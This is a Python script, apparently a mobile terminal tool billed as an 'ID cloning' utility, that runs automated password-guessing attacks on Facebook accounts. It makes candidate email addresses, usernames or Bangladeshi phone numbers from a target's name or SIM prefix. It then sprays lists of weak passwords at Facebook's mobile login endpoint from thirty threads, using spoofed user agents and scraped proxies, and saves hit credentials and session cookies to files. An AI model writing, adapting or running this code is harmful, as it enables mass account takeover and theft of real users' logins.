import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu

#------------------[ DARK-INTRO ]-------------------#
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update... ')
time.sleep(5)
os.system("git pull")
os.system('clear')
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mInstalling modules... ')
time.sleep(5)
os.system("pkg install espeak")
os.system("pip install requests")
os.system("pip install rich")
os.system("pip install bs4")
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN OUR FACEBOOK GROUP")
time.sleep(1)
os.system(f'xdg-open https://www.facebook.com/groups/2477016825771219')
print()
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY GITHUB ACCOUNT")
time.sleep(1)
os.system(f'xdg-open https://github.com/coderet-d-looper')
print()
attemps = 0
while attemps < 12345677901:
    username = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter username: ')
    print()
    password = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter password: ')

    if username == 'R' and password == 'M':
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mLOGIN SUCCESSFULLY.....')
        os.system('espeak -a 300 " Login, Successfull"')
        time.sleep(5)
        break
    else:
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;91mIncorrect Please Trying ')
        time.sleep(5)
        attemps += 1
        continue

os.system('clear')

try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'  #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m'  # PUTIH
M = '\x1b[1;91m'  # MERAH
H = '\x1b[1;92m'  # HIJAU
K = '\x1b[1;93m'  # KUNING
B = '\x1b[1;94m'  # BIRU
U = '\x1b[1;95m'  # UNGU
O = '\x1b[1;96m'  # BIRU MUDA
N = '\x1b[0m'  # WARNA MATI
A = '\x1b[1;90m'  # WARNA ABU ABU
BN = '\x1b[1;107m'  # BELAKANG PUTIH
BBL = '\x1b[1;106m'  # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m'  # BELAKANG PINK
BB = '\x1b[1;104m'  # BELAKANG BIRU
BK = '\x1b[1;103m'  # BELAKANG KUNING
BH = '\x1b[1;102m'  # BELAKANG HIJAU
BM = '\x1b[1;101m'  # BELAJANG MERAH
BA = '\x1b[1;100m'  # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
loop = 0
oks = []
cps = []
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
    proxy = requests.get(
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt', 'w').write(proxy)
except Exception as e:
    print('')
proxy = open('.proxy.txt', 'r').read().splitlines()

for x in range(5000):
    android_version = f"{random.randint(4, 12)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    android_os = f"Android {android_version}"
    model = random.choice(['GT-I9300', 'GT-I9500', 'GT-N7100', 'GT-I9100', 'GT-I9505', 'GT-N7000', 'GT-I9000', 'GT-I9082', 'GT-S5360', 'GT-I9192','GT-S5830', 'GT-I9506', 'GT-S7562', 'GT-I9190', 'GT-I9305', 'GT-I9060', 'GT-I9301', 'GT-I9308', 'GT-I9060I', 'GT-I9308I','GT-I8160', 'GT-S7262', 'GT-S5830i', 'GT-S7582', 'GT-S6802', 'GT-I8190', 'GT-S5282', 'GT-I9070', 'GT-I8262', 'GT-I8552','GT-S6102', 'GT-I9305T', 'GT-I9508', 'GT-S7580', 'GT-I9507', 'GT-S5300', 'GT-I9063T', 'GT-I9195', 'GT-S6310', 'GT-S7560','GT-S5301', 'GT-I9070P', 'GT-S7275', 'GT-I9105', 'GT-S6312', 'GT-I9308T', 'GT-I8550', 'GT-I9152', 'GT-I9200', 'GT-S7390',])
    build = f"Build/R{random.randint(10, 99)}NW"
    fb_app_version = f"FBAV/{random.randint(190, 199)}.0.0.{random.randint(10, 99)}"
    fb_locale = random.choice(["en_US", "th_TH", "fr_FR", "de_DE", "es_ES", "it_IT"])
    fb_carrier = random.choice(["AIS", "DTAC", "TrueMove"])
    fb_manufacturer = random.choice(["samsung"])
    fb_device = f"FBMF/{fb_manufacturer};FBBD/{fb_manufacturer};FBDV/{model};FBSV/{android_version};FBCA/armeabi-v7a:armeabi"
    fb_display_metrics = f"FBDM/{{density=3.0,width={random.randint(720, 1440)},height={random.randint(1280, 2560)}}}"
    fb_fw = f"FB_FW/{random.randint(1, 5)}"
    user_agent = f"Dalvik/2.1.0 (Linux; U; {android_os}; {model} {build}) [FBAN/Orca-Android;{fb_app_version};FBPN/com.facebook.orca;FBLC/{fb_locale};FBBV/{random.randint(100000000, 999999999)};FBCR/{fb_carrier};{fb_device};{fb_display_metrics};{fb_fw};]"
    ugen.append(user_agent)

for x in range(5000):
    android_version = f"{random.randint(4, 12)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    android_os = f"Android {android_version}"
    model = random.choice(['Mi 11', 'Mi 11 Pro', 'Mi 11i', 'Mi 11X', 'Mi 11X Pro', 'Mi 11 Lite', 'Mi 11 Lite 5G', 'Mi 11 Ultra', 'Mi 10', 'Mi 10 Pro','Mi 10 Lite', 'Mi 10 Youth', 'Mi 10T', 'Mi 10T Pro', 'Mi 10T Lite', 'Mi 10i', 'Mi 9', 'Mi 9 Pro', 'Mi 9 Lite', 'Mi 9T', 'Mi 9T Pro','Mi 9 SE', 'Mi Mix 4', 'Mi Mix Fold', 'Mi Mix Alpha', 'Mi Mix 3', 'Mi Mix 3 5G', 'Mi Mix 2', 'Mi Mix 2S', 'Mi Mix 2 Pro', 'Mi Mix','Mi Mix Nano', 'Mi Note 10', 'Mi Note 10 Pro', 'Mi Note 10 Lite', 'Mi Note 9', 'Mi Note 9 Pro', 'Mi Note 9S', 'Mi Note 9 Pro Max','Mi Note 9 Pro 5G', 'Mi Note 9T', 'Mi Note 8', 'Mi Note 8 Pro', 'Mi Note 8T', 'Mi Note 7', 'Mi Note 7 Pro', 'Mi Note 6', 'Mi Note 6 Pro','Mi Note 5', 'Mi A3', 'Mi A2', 'Mi A2 Lite', 'Mi A1', 'Mi A1 Lite'])
    build = f"Build/R{random.randint(10, 99)}NW"
    fb_app_version = f"FBAV/{random.randint(190, 199)}.0.0.{random.randint(10, 99)}"
    fb_locale = random.choice(["en_US", "th_TH", "fr_FR", "de_DE", "es_ES", "it_IT"])
    fb_carrier = random.choice(["AIS", "DTAC", "TrueMove"])
    fb_manufacturer = random.choice(["xiaomi"])
    fb_device = f"FBMF/{fb_manufacturer};FBBD/{fb_manufacturer};FBDV/{model};FBSV/{android_version};FBCA/armeabi-v7a:armeabi"
    fb_display_metrics = f"FBDM/{{density=3.0,width={random.randint(720, 1440)},height={random.randint(1280, 2560)}}}"
    fb_fw = f"FB_FW/{random.randint(1, 5)}"
    user_agent = f"Dalvik/2.1.0 (Linux; U; {android_os}; {model} {build}) [FBAN/Orca-Android;{fb_app_version};FBPN/com.facebook.orca;FBLC/{fb_locale};FBBV/{random.randint(100000000, 999999999)};FBCR/{fb_carrier};{fb_device};{fb_display_metrics};{fb_fw};]"
    ugen.append(user_agent)


logo =("""

██████╗░░█████╗░██████╗░██╗░░██╗        ███████╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝        ╚════██║
██║░░██║███████║██████╔╝█████═╝░        ░░███╔═╝
██║░░██║██╔══██║██╔══██╗██╔═██╗░        ██╔══╝░░
██████╔╝██║░░██║██║░░██║██║░╚██╗        ███████╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝        ╚══════╝

\033[1;91m\033[1;41m\033[1;97m              Be you, The world will adjust               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[👨] AUTHOR    :\033[1;32m DARK X FUZED 
\033[1;32m[📖] GITHUB    :\033[1;32m CODERET-D-LOOPER
\033[1;32m[😇] FACEBOOK  :\033[1;32m FIRDAWS SAPNO
\033[1;32m[💉] TOOLS     :\033[1;32m RANDOM
\033[1;32m[📅] VERSION   :\033[1;32m 2.0
\033[1;32m[🚀] STATUS    :\033[1;32m WORKING
\033[1;32m[⏳] UPDATE    :\033[1;32m AUTO-UPDATE [ON]
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m WORKING ONLY ON MOBILE DATA\033[;0m\033[1;91m═══>\033[1;92m""")

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        print(" \033[1;97m[1] EMAIL ID CLONING     \033[1;91m[WORKING] ")
        print(" \033[1;97m[2] USERNAME CLONING     \033[1;35m[BEST]")
        print(" \033[1;97m[3] RANDOM CLONING       \033[1;33m[FIRE]")
        print(" \033[1;97m[0] Exit")
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        Snigdho = input(" [√] CHOOSE : ")
        if Snigdho in ["1", "01"]:
            v1()
        if Snigdho in ["2", "02"]:
            v2()
        if Snigdho in ["3", "03"]:
            v3()
        if Snigdho in ["0", "00"]:
            exit()
        else:
            exit()


def v1():
    user = []
    os.system('clear')
    print(logo)
    kode = input('[🔥]TARGET FIRST NAME : ')
    kodex = input('[🔥]TARGET LAST NAME :  ')
    print('[🤝]example Domain : @gmail.com, @yahoo.com ')
    domain = input('[📧]Input Domain  : ')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1, 4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[🔥]Total ids:\033[1;92m ' + tl)
        print(f"\033[1;97m [🔥]Target Domain:\033[1;92m {domain}")
        print('\033[1;97m[🔥]The process has been started')
        print('[🔥]Wait for ids ')
        print(50 * '_')
        for guru in user:
            uid = kode + kodex + guru + domain
            pwx = [kode, kodex, kode + kodex, kode + '123', kode + '1234', kode + '12345', kode + guru, kode + '@', kode + '@@', kode + '@@@', kode + '@@@@', kodex + '@', kodex + '@@', kodex + '@@@', kodex + '@@@@', kodex + '123',
                   kodex + '1234', kodex + '12345', kode + '11', kode + '12', kode + '1122', kode + '@#', kodex + '11', kodex + '12', kodex + '1122', kodex + '@#']
            yaari.submit(rcrack, uid, pwx, tl)
    print(50 * '_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50 * '_')


def v2():
    user = []
    os.system('clear')
    print(logo)
    kode = input('[🔥] TARGET FIRST NAME : ')
    kodex = input('[🔥]TARGET LAST NAME :  ')
    domain = '.'
    limit = int(input('[?]ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1, 4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[🔥]Total ids:\033[1;92m ' + tl)
        print(f"\033[1;97m[♥]Target Doamin:\033[1;92mUSERNAME CLONING")
        print('\033[1;97m[♥]The process has been started')
        print('[♥]Wait for ids ')
        print(50 * '_')
        for guru in user:
            uid = kode + domain + kodex + guru
            pwx = [kode, kodex, kode + kodex, kode + '123', kode + '1234', kode + '12345', kode + guru, kode + '@', kode + '@@', kode + '@@@', kode + '@@@@', kodex + '@', kodex + '@@', kodex + '@@@', kodex + '@@@@', kodex + '123',
                   kodex + '1234', kodex + '12345', kode + '11', kode + '12', kode + '1122', kode + '@#', kodex + '11', kodex + '12', kodex + '1122', kodex + '@#']
            yaari.submit(rcrack, uid, pwx, tl)
    print(50 * '_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50 * '_')


def v3():
    user = []
    os.system('clear')
    print(logo)
    os.system('espeak -a 300 " Welcome, to, random, cloning, tool"')
    print(" BD SIM CODE=><>< 017,018,019,014,013,015")
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    os.system('espeak -a 300 " Enter, sim ,code"')
    kode = input('[📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    limit = int(input(' [?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;33m[♥]  TOTAL IDS :\033[1;92m ' + tl)
        print( "\033[1;33m[♥]  YOUR TARGET CRACK MENU:\033[1;92mRANDOM CLONING")
        print('\033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
        print(f"\033[1;33m[♥]  CHOOSEN SIM CODE:\033[1;92m {kode}")
        print("""\033[1;91m\033[1;41m\033[1;97m USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m\033[1;92m""")
        print(50 * '_')
        for guru in user:
            uid = kode + kodex + kod + guru
            pwx = [kode + kodex + kod + guru, kod + guru, kodex + guru, kode + kodex + kod, kod + kodex + kode, kode + kodex, kodex + kod, kodex + kod + guru, kode + guru, 'Bangladesh', 'i love you', 'sadiya', 'fariya', 'sanjida', 'fatema', 'Farjana', 'jannat', '102030', '203040', '304050', '405060', '506070', '607080', '708090', '809010', 'mababa', 'shahin', 'sumaiya']
            yaari.submit(rcrack,uid,pwx,tl)
    print(50 * '_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50 * '_')

def rcrack(uid, pwx, tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            sys.stdout.write(f'\r  \33[1;94m[\033[1;37mDARK\33[1;94m][\033[1;37m%s\33[1;94m/\033[1;37m%s\33[1;94m]\33[1;94m[\033[1;32mOK-%s\33[1;94m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
           'method': 'GET',
           'scheme': 'https',
           'access-control-allow-origin': '*',
           'facebook-api-version': 'v17.0',
           'strict-transport-security': 'max-age=15552000; preload',
           'pragma': 'no-cache',
           'cache-control': 'private, no-cache, no-store, must-revalidate',
           'x-fb-request-id': 'AQwly5VMr_y-yrCkovKzJga',
           'x-fb-trace-id': 'GFI/zKE1ENh',
           'x-fb-rev': '1007942871',
           'x-fb-debug': '6RjWdxox4h2HbM3A+ljJrv8wkYgyB4OKh1Y+Wx4y8YtQhIZwM3r7u4dQ0hXb3ixIrkSzvtzH7J2Y11HcNWfRuQ==',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': pro,
}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'datr=' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[DARK-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[COOKIES🌺] • \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/DARK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[DARK-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                os.system('espeak -a 300 " CP"')
                open('/sdcard/DARK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:pass 
Main()
 
